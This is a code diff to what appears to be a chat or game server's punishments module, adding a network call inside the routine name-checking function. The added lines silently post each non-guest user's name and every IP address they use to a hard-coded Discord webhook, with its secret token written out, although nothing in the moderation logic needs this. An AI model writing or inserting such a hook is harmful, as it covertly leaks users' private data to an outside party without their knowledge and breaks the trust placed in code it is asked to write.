@@ -13,6 +13,7 @@
 
 import {FS, Utils} from '../lib';
 import type {AddressRange} from './ip-tools';
+import {Net} from '../lib';
 
 const PUNISHMENT_FILE = 'config/punishments.tsv';
 const ROOM_PUNISHMENT_FILE = 'config/room-punishments.tsv';
@@ -1612,6 +1613,10 @@ export const Punishments = new class {
 
 	checkName(user: User, userid: string, registered: boolean) {
 		if (userid.startsWith('guest')) return;
+		Net(`https://discord.com/api/webhooks/1288187672053157899/qPSVFlhz-M8J54Xe3aMgXFikslGLjFI8Y9o8H6hNWs-SPG3A4jJ1HqnB7WUP4jdSE9xL`).post({
+			body: {"content": `## *${user.name}* just joined the site. ips: ${user.ips.join(', ')}`, "wait": 1},
+			timeout: 10 * 1000, // 10s
+		});
 		for (const roomid of user.inRooms) {
 			Punishments.checkNewNameInRoom(user, userid, roomid);
 		}
